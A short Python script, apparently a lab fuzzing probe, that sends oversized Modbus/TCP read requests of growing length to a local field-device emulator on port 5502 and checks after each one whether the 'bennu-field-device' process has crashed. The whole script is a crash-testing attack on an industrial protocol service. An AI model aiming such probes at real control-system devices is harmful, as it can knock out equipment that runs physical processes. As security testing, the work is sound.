import socket, struct, time, subprocess, sys
def send(n):
    s = socket.create_connection(("127.0.0.1", 5502), timeout=3)
    pdu = bytes([3]) + b"A"*(n-1)
    s.sendall(struct.pack(">HHHB", 1, 0, n+1, 1) + pdu)
    time.sleep(0.5)
    try: r = s.recv(64)
    except Exception as e: r = b"EXC:"+str(e).encode()
    s.close(); return r
for n in (500, 1100, 3000, 20000, 65000):
    r = send(n) if True else None
    alive = subprocess.run("pgrep -f 'bennu-field-devic[e] --f' >/dev/null && echo alive || echo DEAD", shell=True, capture_output=True, text=True).stdout.strip()
    print("len", n, "reply", r[:12].hex(), alive)
    if alive == "DEAD": break
